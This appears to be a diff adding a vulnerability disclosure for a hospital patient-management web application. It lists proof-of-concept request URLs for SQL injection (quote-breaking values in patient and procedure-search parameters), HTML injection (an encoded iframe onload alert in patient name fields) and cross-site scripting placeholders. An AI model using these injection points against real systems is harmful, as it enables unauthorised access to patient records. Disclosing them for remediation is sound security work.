@@ -1,0 +1,67 @@
+SQL Injection vulnerabilities:
+
+http://www.example.com/modules/patient/mycare2x_pat_info.php?sid=moq09jafqbl4leasdpvcl7qi56&lang=-1%27&aktion=-1%27[SQL-Injection!]
+&callurl=-1%27[SQL-Injection!]&myPid=403
+
+http://www.example.com/modules/drg/mycare2x_proc_search.php?myAction=Suchen&myOpsEintrag=-
+
+1%27[SQL-Injection!&val=&itemx=&mode=&sid=moq09jafqbl4ledgppvcl7qi56&lang=de&pn=100224&opnr=&ln=Gexxxn&fn=Brxo&bd=&dept_nr=&oprm=&display=
+&group_nr=&edit=1&icdtype=&y=&m=&d=&zusatzcode=&keyword=[SQL-Injection!]
+
+http://www.example.com/modules/patient/mycare_pid.php?pid=&ext_pid=&date_reg=&pat_type=Self&panel=1&title1=&title=&name_last=-
+
+1%27[SQL-Injection!&name_first=&name_middle=&name_maiden=&name_others=&extern_access=&date_birth=&sex1=m&sex=m&civil_status1=&
+civil_status=&scitizenship=...&citizenship=&sreligion=...&religion=&sethnic_orig=..ð_orig=&addr_str=&addr_str_nr=&addr_zip=
+&addr_town=&addr_citytown=&addr_citytown_nr=&nat_id_nr=DE&country_state=&phone_1_code=&phone_1
+
+_nr=&phone_2_code=&phone_2_nr=&cellphone_1_nr=&cellphone_2_nr=&fax=&email=&insurance_name=&insurance_instnr=
+&insurance_vknr=&insurance_nr=&insurance_state=&insurance_state1=&insurance_card_expire=&sid=moq09jafqbl4ledgppvcl7qi56&lang=
+en&myAction=&myFind=Find&myselectnr=&insurance_id=&nr=&edit=1&ref=&is_addon=&preselected_city=&i_acti
+
+ve=0&i_max=2&activ_tab_id=0&recognition=&smartcard=&smartcarddata=
+
+http://www.example.com/modules/patient/mycare_pid.php?pid=[SQL-Injection!]
+
+
+HTML Injection Vulnerabilities:
+
+http://www.example.com/modules/patient/mycare_pid.php?pid=&ext_pid=&date_reg=2012-04-19+06%3A00%3A00&pat_type=
+Self&panel=1&title1=&title=&name_last=%22%3E
+
+%3Ciframe+src%3Da+onload%3Dalert%28%22VL%22%29+%3C&name_first=%22%3E%3Ciframe+src%3Da+onload%3Dalert%28%22VL%22%29+%
+3C&name_middle=%22%3E%3Ciframe+src%3Da+onload
+
+%3Dalert%28%22VL%22%29+%3C&name_maiden=%22%3E%3Ciframe+src%3Da+onload%3Dalert%28%22VL%22%29+
+
+%3C&name_others=&extern_access=&date_birth=&sex1=m&sex=m&civil_status1=&civil_status=&scitizenship=...&citizenship=&s
+religion=...&religion=&sethnic_orig=..ð_orig
+
+=&addr_str=&addr_str_nr=&addr_zip=&addr_town=&addr_citytown=&addr_citytown_nr=&nat_id_nr=DE&country_state=&phone_1_code=
+&phone_1_nr=&phone_2_code=&phone_2_nr=&cellphon
+
+e_1_nr=&cellphone_2_nr=&fax=&email=&insurance_name=&insurance_instnr=&insurance_vknr=&insurance_nr=&insurance_state=&insurance_state1=
+&insurance_card_expire=&sid=moq09
+
+jafqbl4ledgppvcl7qi56&lang=en&myAction=Save&myFind=Find&myselectnr=&insurance_id=&nr=&edit=1&ref=&is_addon=&preselected_city=
+&i_active=0&i_max=2&activ_tab_id=0&recogni
+
+tion=&smartcard=&smartcarddata=
+
+
+Cross-site scripting vulnerabilities:
+
+http://www.example.com/modules/nursing/mycare_ward_print.php?sid=moq09jafqbl4ledgppvcl7qi56&lang=de&favorites=[Cross Site 
+Scripting!]
+
+http://www.example.com/modules/nursing/mycare_ward_print.php?sid=moq09jafqbl4ledgppvcl7qi56&lang=[Cross Site 
+Scripting!]&favorites=[Cross Site Scripting!]
+
+http://www.example.com/modules/patient/mycare2x_pat_info.php?sid=moq09jafqbl4ledgppvcl7qi56&lang=de&aktion=[Cross Site 
+Scripting!]&callurl=topwin&myPid=403
+
+http://www.example.com/modules/patient/mycare2x_pat_info.php?sid=moq09jafqbl4ledgppvcl7qi56&lang=de&aktion=|PRI|AVE|FLB|&callurl=[CrossSite Scripting!]&myPid=403
+
+http://www.example.com/modules/drg/mycare2x_proc_search.phpmyAction=Suchen&myOpsEintrag=1
+&val=&itemx=&mode=&sid=moq09jafqbl4ledgppvcl7qi56&lang=de&pn=100224&opnr=&ln=[Cross Site 
+Scripting!]&fn=Brxo&bd=&dept_nr=&oprm=&display=&group_nr=&edit=1&icdtype=&y=&m=&d=&zusatzcode=&keyword=2
+
